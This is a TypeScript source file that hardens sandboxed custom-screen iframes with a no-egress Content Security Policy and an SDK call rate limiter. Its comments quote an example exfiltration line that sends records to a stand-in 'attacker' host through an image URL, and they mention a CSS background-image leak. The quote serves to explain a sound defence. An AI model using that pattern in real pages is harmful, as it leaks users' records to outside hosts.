// Shared hardening for the sandboxed custom-screen runtimes (form + app).

// CSP applied INSIDE the screen's iframe. The SDK talks to the parent via postMessage (not affected by
// CSP), so the screen needs no network of its own. The policy is deliberately NO-EGRESS: a screen can
// read records through the FormLogic SDK, so ANY outbound request is a data-exfiltration channel.
//   - connect-src 'none'    → blocks fetch/XHR/WebSocket/sendBeacon.
//   - img/font/media limited to data:/blob: (local only) → blocks the classic `new Image().src =
//     'https://attacker/?d='+records` leak AND CSS `background-image:url(https://…)` exfil. NO remote
//     https: hosts — custom screens must inline/data-URI any imagery; there are no remote webfonts.
//   - default-src 'none'    → blocks plugins/objects/prefetch/etc.
//   - base-uri/form-action 'none' → prevents <base> and form-submission hijacking.
// If you ever need real assets in a screen, add a controlled FormLogic asset mechanism — never widen
// this to `https:`. See docs/CUSTOM_SCREEN_DASHBOARD_KIT.md ("no remote images/fonts/media").
export const SCREEN_CSP =
  "default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; "
  + "img-src data: blob:; font-src data:; media-src data: blob:; "
  + "connect-src 'none'; base-uri 'none'; form-action 'none'";

/**
 * Per-runtime SDK rate limiter. The iframe can loop arbitrarily; even though it can't reach the network
 * directly, it could spam the parent's SDK bridge. This caps calls per action over a rolling minute.
 * Returns true if the call is allowed.
 */
export function createSdkRateLimiter() {
  const calls: Record<string, number[]> = {};
  const caps: Record<string, number> = { submit: 30, records: 60, toast: 20 };
  return (action: string): boolean => {
    const cap = caps[action] ?? 120;
    const now = Date.now();
    const arr = (calls[action] = (calls[action] || []).filter((t) => now - t < 60000));
    if (arr.length >= cap) return false;
    arr.push(now);
    return true;
  };
}
